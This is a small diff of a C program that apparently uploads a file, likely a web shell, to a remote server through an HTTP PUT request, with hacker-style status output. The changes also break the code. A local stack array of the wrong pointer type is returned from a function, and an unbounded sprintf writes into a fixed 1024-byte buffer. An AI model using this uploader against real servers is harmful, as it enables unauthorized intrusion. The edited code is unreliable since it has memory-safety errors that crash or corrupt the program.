@@ -47,10 +47,9 @@ char *file_content(char * file_location){
 	size = ftell(shell);
 	fseek(shell, 0, SEEK_SET);
 
-	char *buffer = malloc(size+1);
+	char *buffer[size + 1];
 	fread(buffer,1,size,shell);
 	fclose(shell);
-	free(buffer);
 	return buffer;
 }
 
@@ -91,7 +90,7 @@ int request(char *target, char *file, char *create, char *path){
 
 	printf("\033[1;32m[+]\033[0m Connected !!!\n");
 
-	char *put;
+	char put[1024];
 
 	sprintf(put,"PUT %s%s HTTP/1.1\r\nContent-Length: %i\r\nHost: %s\r\nConnection: close\r\n\r\n%s\r\n\r\n\r\n",path,create,size,target,conteudo);
 
